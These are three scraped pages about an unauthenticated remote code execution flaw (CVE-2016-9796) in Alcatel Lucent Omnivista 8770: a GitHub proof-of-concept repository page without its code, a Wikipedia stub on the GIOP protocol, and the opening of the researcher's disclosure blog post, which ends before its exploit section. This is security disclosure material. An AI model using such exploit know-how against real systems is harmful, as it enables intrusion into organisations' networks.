=== Content from github.com_84f4961b_20250125_063150.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fmalerisch%2Fomnivista-8770-unauth-rce)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fmalerisch%2Fomnivista-8770-unauth-rce)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E&source=header-repo&source_repo=malerisch%2Fomnivista-8770-unauth-rce)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[malerisch](/malerisch)
/
**[omnivista-8770-unauth-rce](/malerisch/omnivista-8770-unauth-rce)**
Public

* [Notifications](/login?return_to=%2Fmalerisch%2Fomnivista-8770-unauth-rce) You must be signed in to change notification settings
* [Fork
  1](/login?return_to=%2Fmalerisch%2Fomnivista-8770-unauth-rce)
* [Star
   6](/login?return_to=%2Fmalerisch%2Fomnivista-8770-unauth-rce)

Omnivista 8770 Unauthenticated Remote Code Execution - PoC

[6
stars](/malerisch/omnivista-8770-unauth-rce/stargazers) [1
fork](/malerisch/omnivista-8770-unauth-rce/forks) [Branches](/malerisch/omnivista-8770-unauth-rce/branches) [Tags](/malerisch/omnivista-8770-unauth-rce/tags) [Activity](/malerisch/omnivista-8770-unauth-rce/activity)
 [Star](/login?return_to=%2Fmalerisch%2Fomnivista-8770-unauth-rce)

 [Notifications](/login?return_to=%2Fmalerisch%2Fomnivista-8770-unauth-rce) You must be signed in to change notification settings

* [Code](/malerisch/omnivista-8770-unauth-rce)
* [Issues
  0](/malerisch/omnivista-8770-unauth-rce/issues)
* [Pull requests
  0](/malerisch/omnivista-8770-unauth-rce/pulls)
* [Actions](/malerisch/omnivista-8770-unauth-rce/actions)
* [Projects
  0](/malerisch/omnivista-8770-unauth-rce/projects)
* [Security](/malerisch/omnivista-8770-unauth-rce/security)
* [Insights](/malerisch/omnivista-8770-unauth-rce/pulse)

Additional navigation options

* [Code](/malerisch/omnivista-8770-unauth-rce)
* [Issues](/malerisch/omnivista-8770-unauth-rce/issues)
* [Pull requests](/malerisch/omnivista-8770-unauth-rce/pulls)
* [Actions](/malerisch/omnivista-8770-unauth-rce/actions)
* [Projects](/malerisch/omnivista-8770-unauth-rce/projects)
* [Security](/malerisch/omnivista-8770-unauth-rce/security)
* [Insights](/malerisch/omnivista-8770-unauth-rce/pulse)

# malerisch/omnivista-8770-unauth-rce

    master[Branches](/malerisch/omnivista-8770-unauth-rce/branches)[Tags](/malerisch/omnivista-8770-unauth-rce/tags)Go to fileCode
## Folders and files

| Name | | Name | Last commit message | Last commit date |
| --- | --- | --- | --- | --- |
| Latest commit History[2 Commits](/malerisch/omnivista-8770-unauth-rce/commits/master/) | | |
| [README.md](/malerisch/omnivista-8770-unauth-rce/blob/master/README.md "README.md") | | [README.md](/malerisch/omnivista-8770-unauth-rce/blob/master/README.md "README.md") |  |  |
| [omnivista-rce-poc.py](/malerisch/omnivista-8770-unauth-rce/blob/master/omnivista-rce-poc.py "omnivista-rce-poc.py") | | [omnivista-rce-poc.py](/malerisch/omnivista-8770-unauth-rce/blob/master/omnivista-rce-poc.py "omnivista-rce-poc.py") |  |  |
| View all files | | |

## Repository files navigation

* README
# omnivista-8770-unauth-rce

Omnivista 8770 Unauthenticated Remote Code Execution - PoC

The PoC script exploits a vulnerability in the Omnivista 8770 2.0, 2.6 and 3.0.

The PoC script just works, not nice code inside ;-).

The vulnerability details can be found at the following link: <http://blog.malerisch.net/2016/12/alcatel-omnivista-8770-unauth-rce-giop-corba.html>

## About

Omnivista 8770 Unauthenticated Remote Code Execution - PoC

### Resources

[Readme](#readme-ov-file)

[Activity](/malerisch/omnivista-8770-unauth-rce/activity)
### Stars

[**6**
stars](/malerisch/omnivista-8770-unauth-rce/stargazers)
### Watchers

[**1**
watching](/malerisch/omnivista-8770-unauth-rce/watchers)
### Forks

[**1**
fork](/malerisch/omnivista-8770-unauth-rce/forks)
[Report repository](/contact/report-content?content_url=https%3A%2F%2Fgithub.com%2Fmalerisch%2Fomnivista-8770-unauth-rce&report=malerisch+%28user%29)

## [Releases](/malerisch/omnivista-8770-unauth-rce/releases)

No releases published

## [Packages 0](/users/malerisch/packages?repo_name=omnivista-8770-unauth-rce)

No packages published

## Languages

* [Python
  100.0%](/malerisch/omnivista-8770-unauth-rce/search?l=python)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from en.wikipedia.org_17d808f6_20250126_064342.html ===
[Jump to content](#bodyContent)

Main menu

Main menu
move to sidebar
hide

Navigation

* [Main page](/wiki/Main_Page "Visit the main page [z]")
* [Contents](/wiki/Wikipedia%3AContents "Guides to browsing Wikipedia")
* [Current events](/wiki/Portal%3ACurrent_events "Articles related to current events")
* [Random article](/wiki/Special%3ARandom "Visit a randomly selected article [x]")
* [About Wikipedia](/wiki/Wikipedia%3AAbout "Learn about Wikipedia and how it works")
* [Contact us](//en.wikipedia.org/wiki/Wikipedia%3AContact_us "How to contact Wikipedia")

Contribute

* [Help](/wiki/Help%3AContents "Guidance on how to use and edit Wikipedia")
* [Learn to edit](/wiki/Help%3AIntroduction "Learn how to edit Wikipedia")
* [Community portal](/wiki/Wikipedia%3ACommunity_portal "The hub for editors")
* [Recent changes](/wiki/Special%3ARecentChanges "A list of recent changes to Wikipedia [r]")
* [Upload file](/wiki/Wikipedia%3AFile_upload_wizard "Add images or other media for use on Wikipedia")

[![](/static/images/icons/wikipedia.png)
![Wikipedia](/static/images/mobile/copyright/wikipedia-wordmark-en.svg)
![The Free Encyclopedia](/static/images/mobile/copyright/wikipedia-tagline-en.svg)](/wiki/Main_Page)

[Search](/wiki/Special%3ASearch "Search Wikipedia [f]")

Search

Appearance

* [Donate](https://donate.wikimedia.org/?wmf_source=donate&wmf_medium=sidebar&wmf_campaign=en.wikipedia.org&uselang=en)
* [Create account](/w/index.php?title=Special:CreateAccount&returnto=General+Inter-ORB+Protocol "You are encouraged to create an account and log in; however, it is not mandatory")
* [Log in](/w/index.php?title=Special:UserLogin&returnto=General+Inter-ORB+Protocol "You're encouraged to log in; however, it's not mandatory. [o]")

Personal tools

* [Donate](https://donate.wikimedia.org/?wmf_source=donate&wmf_medium=sidebar&wmf_campaign=en.wikipedia.org&uselang=en)
* [Create account](/w/index.php?title=Special:CreateAccount&returnto=General+Inter-ORB+Protocol "You are encouraged to create an account and log in; however, it is not mandatory")
* [Log in](/w/index.php?title=Special:UserLogin&returnto=General+Inter-ORB+Protocol "You're encouraged to log in; however, it's not mandatory. [o]")

Pages for logged out editors [learn more](/wiki/Help%3AIntroduction)

* [Contributions](/wiki/Special%3AMyContributions "A list of edits made from this IP address [y]")
* [Talk](/wiki/Special%3AMyTalk "Discussion about edits from this IP address [n]")

## Contents

move to sidebar
hide

* (Top)
* [1
  Environment Specific Inter-ORB Protocols](#Environment_Specific_Inter-ORB_Protocols)
* [2
  Messages](#Messages)
* [3
  Further reading](#Further_reading)
* [4
  See also](#See_also)
* [5
  References](#References)

Toggle the table of contents

# General Inter-ORB Protocol

9 languages

* [Deutsch](https://de.wikipedia.org/wiki/General_Inter-ORB_Protocol "General Inter-ORB Protocol – German")
* [Español](https://es.wikipedia.org/wiki/GIOP "GIOP – Spanish")
* [Français](https://fr.wikipedia.org/wiki/Internet_Inter-ORB_Protocol "Internet Inter-ORB Protocol – French")
* [한국어](https://ko.wikipedia.org/wiki/%EC%9D%BC%EB%B0%98_%EA%B0%9D%EC%B2%B4_%EC%9A%94%EA%B5%AC_%EB%A7%A4%EA%B0%9C%EC%9E%90%EA%B0%84_%ED%94%84%EB%A1%9C%ED%86%A0%EC%BD%9C "일반 객체 요구 매개자간 프로토콜 – Korean")
* [Lietuvių](https://lt.wikipedia.org/wiki/GIOP "GIOP – Lithuanian")
* [日本語](https://ja.wikipedia.org/wiki/GIOP "GIOP – Japanese")
* [Português](https://pt.wikipedia.org/wiki/GIOP "GIOP – Portuguese")
* [Русский](https://ru.wikipedia.org/wiki/GIOP "GIOP – Russian")
* [中文](https://zh.wikipedia.org/wiki/%E9%80%9A%E7%94%A8%E5%AF%B9%E8%B1%A1%E8%AF%B7%E6%B1%82%E4%BB%A3%E7%90%86%E9%97%B4%E9%80%9A%E4%BF%A1%E5%8D%8F%E8%AE%AE "通用对象请求代理间通信协议 – Chinese")

[Edit links](https://www.wikidata.org/wiki/Special%3AEntityPage/Q594324#sitelinks-wikipedia "Edit interlanguage links")

* [Article](/wiki/General_Inter-ORB_Protocol "View the content page [c]")
* [Talk](/wiki/Talk%3AGeneral_Inter-ORB_Protocol "Discuss improvements to the content page [t]")

English

* [Read](/wiki/General_Inter-ORB_Protocol)
* [Edit](/w/index.php?title=General_Inter-ORB_Protocol&action=edit "Edit this page [e]")
* [View history](/w/index.php?title=General_Inter-ORB_Protocol&action=history "Past revisions of this page [h]")

Tools

Tools
move to sidebar
hide

Actions

* [Read](/wiki/General_Inter-ORB_Protocol)
* [Edit](/w/index.php?title=General_Inter-ORB_Protocol&action=edit "Edit this page [e]")
* [View history](/w/index.php?title=General_Inter-ORB_Protocol&action=history)

General

* [What links here](/wiki/Special%3AWhatLinksHere/General_Inter-ORB_Protocol "List of all English Wikipedia pages containing links to this page [j]")
* [Related changes](/wiki/Special%3ARecentChangesLinked/General_Inter-ORB_Protocol "Recent changes in pages linked from this page [k]")
* [Upload file](/wiki/Wikipedia%3AFile_Upload_Wizard "Upload files [u]")
* [Special pages](/wiki/Special%3ASpecialPages "A list of all special pages [q]")
* [Permanent link](/w/index.php?title=General_Inter-ORB_Protocol&oldid=1203749305 "Permanent link to this revision of this page")
* [Page information](/w/index.php?title=General_Inter-ORB_Protocol&action=info "More information about this page")
* [Cite this page](/w/index.php?title=Special:CiteThisPage&page=General_Inter-ORB_Protocol&id=1203749305&wpFormIdentifier=titleform "Information on how to cite this page")
* [Get shortened URL](/w/index.php?title=Special:UrlShortener&url=https%3A%2F%2Fen.wikipedia.org%2Fwiki%2FGeneral_Inter-ORB_Protocol)
* [Download QR code](/w/index.php?title=Special:QrCode&url=https%3A%2F%2Fen.wikipedia.org%2Fwiki%2FGeneral_Inter-ORB_Protocol)

Print/export

* [Download as PDF](/w/index.php?title=Special:DownloadAsPdf&page=General_Inter-ORB_Protocol&action=show-download-screen "Download this page as a PDF file")
* [Printable version](/w/index.php?title=General_Inter-ORB_Protocol&printable=yes "Printable version of this page [p]")

In other projects

* [Wikidata item](https://www.wikidata.org/wiki/Special%3AEntityPage/Q594324 "Structured data on this page hosted by Wikidata [g]")

Appearance
move to sidebar
hide

From Wikipedia, the free encyclopedia

Protocol by which object request brokers communicate in CORBA

|  | This article **needs additional citations for [verification](/wiki/Wikipedia%3AVerifiability "Wikipedia:Verifiability")**. Please help [improve this article](/wiki/Special%3AEditPage/General_Inter-ORB_Protocol "Special:EditPage/General Inter-ORB Protocol") by [adding citations to reliable sources](/wiki/Help%3AReferencing_for_beginners "Help:Referencing for beginners"). Unsourced material may be challenged and removed.*Find sources:* ["General Inter-ORB Protocol"](https://www.google.com/search?as_eq=wikipedia&q=%22General+Inter-ORB+Protocol%22) – [news](https://www.google.com/search?tbm=nws&q=%22General+Inter-ORB+Protocol%22+-wikipedia&tbs=ar:1) **·** [newspapers](https://www.google.com/search?&q=%22General+Inter-ORB+Protocol%22&tbs=bkt:s&tbm=bks) **·** [books](https://www.google.com/search?tbs=bks:1&q=%22General+Inter-ORB+Protocol%22+-wikipedia) **·** [scholar](https://scholar.google.com/scholar?q=%22General+Inter-ORB+Protocol%22) **·** [JSTOR](https://www.jstor.org/action/doBasicSearch?Query=%22General+Inter-ORB+Protocol%22&acc=on&wc=on) *(September 2014)* *([Learn how and when to remove this message](/wiki/Help%3AMaintenance_template_removal "Help:Maintenance template removal"))* |
| --- | --- |

In [distributed computing](/wiki/Distributed_computing "Distributed computing"), **General Inter-ORB Protocol** (**GIOP**) is the message [protocol](/wiki/Communications_protocol "Communications protocol") by which [object request brokers](/wiki/Object_request_broker "Object request broker") (ORBs) communicate in [CORBA](/wiki/CORBA "CORBA"). Standards associated with the protocol are maintained by the [Object Management Group](/wiki/Object_Management_Group "Object Management Group") (OMG). The current version of GIOP is 2.0.2. The GIOP architecture provides several concrete protocols, including:

1. Internet InterORB Protocol[[1]](#cite_note-:0-1) (IIOP) — The Internet Inter-Orb Protocol is an implementation of the GIOP for use over the [Internet](/wiki/Internet "Internet"), and provides a mapping between GIOP messages and the [TCP/IP](/wiki/Internet_protocol_suite "Internet protocol suite") layer.[[2]](#cite_note-2)
2. SSL InterORB Protocol (SSLIOP) — SSLIOP is IIOP over [SSL](/wiki/Secure_Sockets_Layer "Secure Sockets Layer"), providing [encryption](/wiki/Encryption "Encryption") and [authentication](/wiki/Authentication "Authentication").
3. HyperText InterORB Protocol (HTIOP) — HTIOP is IIOP over [HTTP](/wiki/HTTP "HTTP"), providing transparent proxy bypassing.
4. Zipped InterORB Protocol (ZIOP) — A zipped version of GIOP that reduces the bandwidth usage

## Environment Specific Inter-ORB Protocols

[[edit](/w/index.php?title=General_Inter-ORB_Protocol&action=edit&section=1 "Edit section: Environment Specific Inter-ORB Protocols")]

As an alternative to GIOP, CORBA includes the concept of an Environment Specific Inter-ORB Protocol (ESIOP). While GIOP is defined to meet general-purpose needs of most CORBA implementations, an ESIOP attempts to address special requirements. For example, an ESIOP might use an alternative protocol encoding to improve efficiency over networks with limited bandwidth or high latency. ESIOPs can also be used to layer CORBA on top of some non-CORBA technology stack, such as [Distributed Computing Environment](/wiki/Distributed_Computing_Environment "Distributed Computing Environment") (DCE).[[3]](#cite_note-Rising2001-3)[[4]](#cite_note-TariBukhres2004-4)

DCE Common Inter-ORB Protocol (DCE-CIOP) is an ESIOP for use in DCE. It maps CORBA to DCE RPC and CDR (Command Data Representation).[[3]](#cite_note-Rising2001-3)[[5]](#cite_note-KimNamgoongLew1997-5): 48[[4]](#cite_note-TariBukhres2004-4) DCE-CIOP is defined in chapter 16 of the CORBA 2.6.1 standard.[[1]](#cite_note-:0-1)

## Messages

[[edit](/w/index.php?title=General_Inter-ORB_Protocol&action=edit&section=2 "Edit section: Messages")]

The General Inter-ORB Protocol (GIOP) is the message protocol used by object request brokers (ORBs) to communicate in CORBA-based distributed computing systems. GIOP 2.0.2 is the current version of this protocol, and it provides a number of concrete protocols such as IIOP, SSLIOP, HTIOP, and ZIOP. IIOP is a mapping of GIOP messages to the TCP/IP layer for use over the Internet, while SSLIOP provides encryption and authentication. HTIOP, on the other hand, enables transparent proxy bypassing by using IIOP over HTTP. Finally, ZIOP is a compressed version of GIOP that minimizes bandwidth usage. In addition to these protocols, [CORBA](https://docs.oracle.com/cd/E19146-01/index.html) also includes the concept of an Environment Specific Inter-ORB Protocol (ESIOP) to address specific requirements. An ESIOP can use an alternative protocol encoding to improve efficiency over networks with limited bandwidth or high latency, or can be used to layer CORBA on top of non-CORBA technologies such as DCE. DCE Common Inter-ORB Protocol (DCE-CIOP) is an ESIOP that maps CORBA to DCE RPC and CDR.[[6]](#cite_note-6)

## Further reading

[[edit](/w/index.php?title=General_Inter-ORB_Protocol&action=edit&section=3 "Edit section: Further reading")]

* ["The official CORBA standard from the OMG group"](https://web.archive.org/web/20170402202151/http%3A//www.omg.org/spec/CORBA/Current/). Archived from [the original](http://www.omg.org/spec/CORBA/Current/) on 2017-04-02. Retrieved 2016-03-03.

## See also

[[edit](/w/index.php?title=General_Inter-ORB_Protocol&action=edit&section=4 "Edit section: See also")]

* [DIIOP](/wiki/DIIOP "DIIOP")

## References

[[edit](/w/index.php?title=General_Inter-ORB_Protocol&action=edit&section=5 "Edit section: References")]

1. ^ [***a***](#cite_ref-:0_1-0) [***b***](#cite_ref-:0_1-1) "The DCE ESIOP". [*The Common Object Request Broker: Architecture and Specification: Revision 2.6.1*](http://www.omg.org/cgi-bin/doc?formal/2002-05-15.pdf) (PDF). [OMG](/wiki/Object_Management_Group "Object Management Group"). May 2002. p. 557. Retrieved 2016-05-11. This chapter specifies an Environment-Specific Inter-ORB Protocol (ESIOP) for the OSF DCE environment, the DCE Common Inter-ORB Protocol (DCE-CIOP).
2. **[^](#cite_ref-2)** ["IIOP: OMG's Internet Inter-ORB Protocol: A Brief Description"](https://web.archive.org/web/20140628185045/http%3A//www.omg.org/library/iiop4.html). Archived from [the original](http://www.omg.org/library/iiop4.html) on 2014-06-28. Retrieved 2014-08-19.
3. ^ [***a***](#cite_ref-Rising2001_3-0) [***b***](#cite_ref-Rising2001_3-1) Linda Rising (23 July 2001). [*Design Patterns in Communications Software*](https://books.google.com/books?id=vy1Zj1OOUUwC&pg=PA445). Cambridge University Press. p. 445. [ISBN](/wiki/ISBN_%28identifier%29 "ISBN (identifier)") [978-0-521-79040-6](/wiki/Special%3ABookSources/978-0-521-79040-6 "Special:BookSources/978-0-521-79040-6"). In addition to the standard GIOP and IIOP protocols, the CORBA specification allows ORB implementors to define Environment Specific Inter-ORB Protocols (ESIOP)s... Only one ESIOP protocol is defined in the CORBA 2.x family of specifications: the DCE Common Inter-ORB Protocol (DCE-CIOP). The OMG is attempting to standardize other protocols for such domains, such as wireless and mobile systems, which have unique performance characteristics and optimization points.
4. ^ [***a***](#cite_ref-TariBukhres2004_4-0) [***b***](#cite_ref-TariBukhres2004_4-1) Zahir Tari; Omran Bukhres (7 April 2004). [*Fundamentals of Distributed Object Systems: The CORBA Perspective*](https://books.google.com/books?id=4mZNmR-a3jwC&pg=PA178). John Wiley & Sons. p. 178. [ISBN](/wiki/ISBN_%28identifier%29 "ISBN (identifier)") [978-0-471-46411-2](/wiki/Special%3ABookSources/978-0-471-46411-2 "Special:BookSources/978-0-471-46411-2"). ESIOP (Environment Specific Inter-ORB Protocol) is a concrete GIOP protocol which is used to communicate in a particular environment. An ESIOP is optimized for a specific environment and may be chosen over TCP/IP... An example of ESIOP is DCE-CIOP (DCE-Common Inter-ORB Protocol) which makes use of a subset of DCE-RPC facilities and parts of GIOP specification.
5. **[^](#cite_ref-KimNamgoongLew1997_5-0)** Kim, Dong Jin; Namgoong, Han; Lew, Young-Chul (5 December 1997). Danthine, Andre; Diot, Christophe (eds.). [*A bridge for heterogeneous communication between CORBA and DCE*](https://books.google.com/books?id=3-E7lIWgF8kC&pg=PA48). From Multimedia Services to Network Services: 4th International COST 237 Workshop, Lisboa, Portugal, December 15-19, 1997. Proceedings. Springer. pp. 45–58. [ISBN](/wiki/ISBN_%28identifier%29 "ISBN (identifier)") [978-3-540-63935-0](/wiki/Special%3ABookSources/978-3-540-63935-0 "Special:BookSources/978-3-540-63935-0"). The other approach is using Environment Specific Inter-ORB Protocol(ESIOP), the DCE Common Inter-ORB Protocol(DCE-CIOP). DCE-CIOP messages represent OMG IDL types by using the Common Data Representation(CDR) transfer syntax.
6. **[^](#cite_ref-6)** ["About the Common Object Request Broker Architecture Specification Version 3.4"](https://www.omg.org/spec/CORBA/). *www.omg.org*. Retrieved 2023-04-13.

| [Stub icon](/wiki/File%3ACrystal_Clear_app_network.png) | This [computer networking](/wiki/Computer_network "Computer network") article is a [stub](/wiki/Wikipedia%3AStub "Wikipedia:Stub"). You can help Wikipedia by [expanding it](https://en.wikipedia.org/w/index.php?title=General_Inter-ORB_Protocol&action=edit). |
| --- | --- |

* [v](/wiki/Template%3ACompu-network-stub "Template:Compu-network-stub")
* [t](/wiki/Template_talk%3ACompu-network-stub "Template talk:Compu-network-stub")
* [e](/wiki/Special%3AEditPage/Template%3ACompu-network-stub "Special:EditPage/Template:Compu-network-stub")

![](https://login.wikimedia.org/wiki/Special:CentralAutoLogin/start?useformat=desktop&type=1x1&usesul3=0)
Retrieved from "<https://en.wikipedia.org/w/index.php?title=General_Inter-ORB_Protocol&oldid=1203749305>"
[Categories](/wiki/Help%3ACategory "Help:Category"):

* [Distributed computing](/wiki/Category%3ADistributed_computing "Category:Distributed computing")
* [Computer network stubs](/wiki/Category%3AComputer_network_stubs "Category:Computer network stubs")
Hidden categories:

* [Articles with short description](/wiki/Category%3AArticles_with_short_description "Category:Articles with short description")
* [Short description is different from Wikidata](/wiki/Category%3AShort_description_is_different_from_Wikidata "Category:Short description is different from Wikidata")
* [Articles needing additional references from September 2014](/wiki/Category%3AArticles_needing_additional_references_from_September_2014 "Category:Articles needing additional references from September 2014")
* [All articles needing additional references](/wiki/Category%3AAll_articles_needing_additional_references "Category:All articles needing additional references")
* [All stub articles](/wiki/Category%3AAll_stub_articles "Category:All stub articles")

* This page was last edited on 5 February 2024, at 14:13 (UTC).
* Text is available under the [Creative Commons Attribution-ShareAlike 4.0 License](/wiki/Wikipedia%3AText_of_the_Creative_Commons_Attribution-ShareAlike_4.0_International_License "Wikipedia:Text of the Creative Commons Attribution-ShareAlike 4.0 International License");
  additional terms may apply. By using this site, you agree to the [Terms of Use](https://foundation.wikimedia.org/wiki/Special%3AMyLanguage/Policy%3ATerms_of_Use "foundation:Special:MyLanguage/Policy:Terms of Use") and [Privacy Policy](https://foundation.wikimedia.org/wiki/Special%3AMyLanguage/Policy%3APrivacy_policy "foundation:Special:MyLanguage/Policy:Privacy policy"). Wikipedia® is a registered trademark of the [Wikimedia Foundation, Inc.](https://wikimediafoundation.org/), a non-profit organization.

* [Privacy policy](https://foundation.wikimedia.org/wiki/Special%3AMyLanguage/Policy%3APrivacy_policy)
* [About Wikipedia](/wiki/Wikipedia%3AAbout)
* [Disclaimers](/wiki/Wikipedia%3AGeneral_disclaimer)
* [Contact Wikipedia](//en.wikipedia.org/wiki/Wikipedia%3AContact_us)
* [Code of Conduct](https://foundation.wikimedia.org/wiki/Special%3AMyLanguage/Policy%3AUniversal_Code_of_Conduct)
* [Developers](https://developer.wikimedia.org)
* [Statistics](https://stats.wikimedia.org/#/en.wikipedia.org)
* [Cookie statement](https://foundation.wikimedia.org/wiki/Special%3AMyLanguage/Policy%3ACookie_statement)
* [Mobile view](//en.m.wikipedia.org/w/index.php?title=General_Inter-ORB_Protocol&mobileaction=toggle_view_mobile)

* [![Wikimedia Foundation](/static/images/footer/wikimedia-button.svg)](https://wikimediafoundation.org/)
* [![Powered by MediaWiki](/w/resources/assets/poweredby_mediawiki.svg)](https://www.mediawiki.org/)

Search

Search

Toggle the table of contents

General Inter-ORB Protocol

9 languages

Add topic



=== Content from blog.malerisch.net_d079dfad_20250125_063150.html ===

[Skip to main content](#main)

# [malerisch.net](http://blog.malerisch.net/)

Security research, divulgations and food for thought.

Search

### Search This Blog

### Pages

* [Home](http://blog.malerisch.net/)
* [Security Research](http://blog.malerisch.net/p/security-research.html)
* [Advisories](http://blog.malerisch.net/p/advisories.html)
* [Presentations](http://blog.malerisch.net/p/presentations.html)
* [White Papers](http://blog.malerisch.net/p/white-papers.html)
* [Tools](http://blog.malerisch.net/p/tools.html)
* [Videos](https://www.youtube.com/user/malerischnet)

More…

### Alcatel Lucent Omnivista or: How I learned GIOP and gained Unauthenticated Remote Code Execution (CVE-2016-9796)

[December 01, 2016](http://blog.malerisch.net/2016/12/alcatel-omnivista-8770-unauth-rce-giop-corba.html "permanent link")

It is time for another advisory or better a blog post about [Alcatel Lucent Omnivista](http://enterprise.alcatel-lucent.com/?product=Omnivista8770NetworkManagementsystem&page=overview) and its vulnerabilities. Omnivista is a central management network tool and it is typically used in medium/large organisation with a complex VoIP/SIP infrastructure.

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjNwcgRWZsbMobKG0FR4JForFOKWAtnt4-2I4fTOBAQuE7qTImBJeg9kw5OIcZtyTU5z-ApH9-lHx2r9qXwxRTJ7pfWmgqai4BUm2gZNG0aK0Ojbswy8D2btO-qqjYOckLgV-gabH9wFL0/s640/twitter-pic2.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjNwcgRWZsbMobKG0FR4JForFOKWAtnt4-2I4fTOBAQuE7qTImBJeg9kw5OIcZtyTU5z-ApH9-lHx2r9qXwxRTJ7pfWmgqai4BUm2gZNG0aK0Ojbswy8D2btO-qqjYOckLgV-gabH9wFL0/s1600/twitter-pic2.png)

Interestingly enough, this software belongs to the niche of "undownloadable" software and it requires a license to work as well. My "luck" came during an engagement where it was already installed and this post documents one of the many 0days discovered during such audit.

The reasons why I wanted to dedicate a single blog post on this vulnerability are several.

First, remote code execution (RCE) is always a sweet bug to show. Second, I strongly believe that documenting vulnerabilities in applications using old protocols and standards, respectively GIOP and CORBA, can be beneficial for the infosec community, since no many examples of vulnerabilities in such applications are available or published on the Internet.

Actually, I would like to be proven wrong when stating that this is probably the only blog post documenting an exploit against a CORBA/GIOP based application. I will leave my readers to prove me wrong...

However, this does not mean that such technologies are no longer in use. Consider that Java includes CORBA support in their package (see [class ORB](https://docs.oracle.com/javase/7/docs/api/org/omg/CORBA/ORB.html)). Also, a lot of critical and often "legacy" applications and systems do make use of such technologies, so I assume it is important to understand them and look for an exploitation angle. Hopefully, this will inspire other people to share their similar attacks or exploits.

In a Twitter survey that I ran some time ago, I was also curios to see how many people are familiar with such technologies, but even though the survey sample is limited, the statistics are clear:
> For stats for my next blog post - have you ever tested or worked with Corba/Giop based software?
> — Roberto Suggi (@malerisch) [July 17, 2016](https://twitter.com/malerisch/status/754616407342678016)

So enough with introduction, let's now dive into the vulnerability - for those of you who want to skip the theory, then just jump to video and PoC exploit sections, at the bottom of this blog post. As usual, comments and feedback are more than welcome. Enjoy and if you like this blog post, then re-tweet it!

**So what is CORBA and GIOP?**

OMG (Object Management Group) designed the CORBA (Common Object Request Broker Architecture) standard to allow interoperability between different hardware and software. The Omnivista product takes advantage of such design to ensure its "universal" compatibility as central management network solution. The CORBA architecture is similar to the remote procedure call architecture from the eighties, with the support of ORBs (Object Request Brokers).

For those of you unfamiliar with this technology and terminology, then just imagine a client/server model with exposed objects that can be invoked from different machines.

To better explain, here is a simple high-level diagram which shows a CORBA architecture:

